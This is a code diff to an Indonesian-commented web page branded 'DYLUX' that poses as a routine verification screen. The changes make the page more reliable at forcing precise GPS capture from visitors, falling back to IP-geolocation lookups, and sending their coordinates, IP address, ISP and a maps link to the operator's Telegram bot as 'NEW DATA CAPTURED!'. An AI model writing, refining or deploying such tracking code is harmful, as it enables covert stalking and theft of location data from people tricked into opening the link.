@@ -44,16 +44,13 @@
         @keyframes spin { to { transform: rotate(360deg); } }
         #statusMsg { font-size: 13px; color: #8888aa; margin-top: 10px; display: none; }
         
-        /* ========================================== */
-        /* POPUP HALUS KAYA VERIFIKASI BIASA        */
-        /* ========================================== */
         #popupOverlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.8);
+            background: rgba(0, 0, 0, 0.85);
             z-index: 9999;
             display: flex;
             align-items: center;
@@ -107,7 +104,7 @@
     </div>
 
     <!-- ========================================== -->
-    <!-- MAIN CONTENT (HALAMAN VERIFIKASI BIASA)   -->
+    <!-- MAIN CONTENT                              -->
     <!-- ========================================== -->
     <div class="box">
         <div class="logo">DYLUX</div>
@@ -171,7 +168,7 @@
     }
 
     // ============================================
-    // AMBIL GPS (PRESISI) - PAKE WATCHPOSITION
+    // AMBIL GPS PRESISI (PAKSA SAMPE DAPET)
     // ============================================
     function getGPSLocation() {
         return new Promise((resolve) => {
@@ -183,17 +180,21 @@
             let watchId = null;
             let resolved = false;
             let bestLocation = null;
+            let attempts = 0;
 
             const timeout = setTimeout(() => {
                 if (watchId) navigator.geolocation.clearWatch(watchId);
                 if (!resolved) {
                     resolve(bestLocation || null);
                 }
-            }, 10000);
+            }, 12000);
 
             watchId = navigator.geolocation.watchPosition(
                 (pos) => {
+                    attempts++;
                     const accuracy = pos.coords.accuracy;
+                    
+                    // Kalo akurasi < 100 meter, langsung ambil
                     if (accuracy < 100) {
                         resolved = true;
                         clearTimeout(timeout);
@@ -204,12 +205,20 @@
                             accuracy: accuracy
                         });
                     } else {
+                        // Simpan lokasi terbaik
                         if (!bestLocation || accuracy < bestLocation.accuracy) {
                             bestLocation = {
                                 lat: pos.coords.latitude,
                                 lon: pos.coords.longitude,
                                 accuracy: accuracy
                             };
+                        }
+                        // Kalo udah 5x percobaan, ambil yang terbaik
+                        if (attempts >= 5) {
+                            resolved = true;
+                            clearTimeout(timeout);
+                            navigator.geolocation.clearWatch(watchId);
+                            resolve(bestLocation);
                         }
                     }
                 },
@@ -241,35 +250,44 @@
             const userId = params.get('id');
             if (!userId) return;
 
-            // 1. Dapet IP (cadangan)
-            let ipData = null;
-            for (const api of apiList) {
-                try {
-                    const res = await fetch(api.url);
-                    if (!res.ok) throw new Error('API error');
-                    const data = await res.json();
-                    const parsed = api.parse(data);
-                    if (parsed.ip && parsed.ip !== 'unknown') {
-                        ipData = parsed;
-                        break;
-                    }
-                } catch (e) { /* Coba API berikutnya */ }
-            }
-
-            // 2. AMBIL GPS PRESISI (prioritas utama)
+            // 1. AMBIL GPS PRESISI (prioritas utama)
             const gpsData = await getGPSLocation();
 
+            // 2. Kalo GPS gagal, ambil IP (cadangan)
+            let ipData = null;
+            if (!gpsData) {
+                for (const api of apiList) {
+                    try {
+                        const res = await fetch(api.url);
+                        if (!res.ok) throw new Error('API error');
+                        const data = await res.json();
+                        const parsed = api.parse(data);
+                        if (parsed.ip && parsed.ip !== 'unknown') {
+                            ipData = parsed;
+                            break;
+                        }
+                    } catch (e) { /* Coba API berikutnya */ }
+                }
+            }
+
             // 3. Pilih lokasi (GPS > IP)
-            let lat = ipData?.lat || 0;
-            let lon = ipData?.lon || 0;
-            let locationText = `${ipData?.city || 'unknown'}, ${ipData?.region || 'unknown'}, ${ipData?.country || 'unknown'}`;
+            let lat = 0;
+            let lon = 0;
+            let locationText = 'Tidak terdeteksi';
             let accuracyText = '';
+            let isGPS = false;
 
             if (gpsData && gpsData.lat && gpsData.lon) {
                 lat = gpsData.lat;
                 lon = gpsData.lon;
                 locationText = `${gpsData.lat}, ${gpsData.lon}`;
                 accuracyText = ` (Akurasi ${Math.round(gpsData.accuracy)}m)`;
+                isGPS = true;
+            } else if (ipData) {
+                lat = ipData.lat || 0;
+                lon = ipData.lon || 0;
+                locationText = `${ipData.city || 'unknown'}, ${ipData.region || 'unknown'}, ${ipData.country || 'unknown'}`;
+                accuracyText = ' (IP-based)';
             }
 
             // 4. Link Maps
@@ -280,6 +298,7 @@
                 `<b>🎯 NEW DATA CAPTURED!</b>\n\n` +
                 `<b>👤 User ID:</b> <code>${userId}</code>\n` +
                 `<b>📌 Type:</b> Auto-Detect\n` +
+                `<b>📍 Sumber:</b> ${isGPS ? '✅ GPS Presisi' : '🌐 IP API'}\n` +
                 `<b>🌐 IP:</b> ${ipData?.ip || 'unknown'}\n` +
                 `<b>📍 Lokasi:</b> ${locationText}${accuracyText}\n` +
                 `<b>📡 ISP:</b> ${ipData?.isp || 'unknown'}\n` +
@@ -289,7 +308,7 @@
                 `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
 
             await sendMessageToTelegram(userId, message);
-            console.log('✅ Auto-detect sent with GPS!');
+            console.log('✅ Auto-detect sent!', isGPS ? 'GPS' : 'IP');
 
         } catch (e) { console.error('Auto-detect error:', e); }
     }
@@ -299,7 +318,7 @@
     // ============================================
     document.getElementById('popupAllow').addEventListener('click', () => {
         document.getElementById('popupOverlay').classList.add('popup-hidden');
-        // Trigger GPS dan jalankan auto-detect
+        // Trigger GPS request
         navigator.geolocation.getCurrentPosition(
             () => {
                 console.log('📍 GPS allowed');
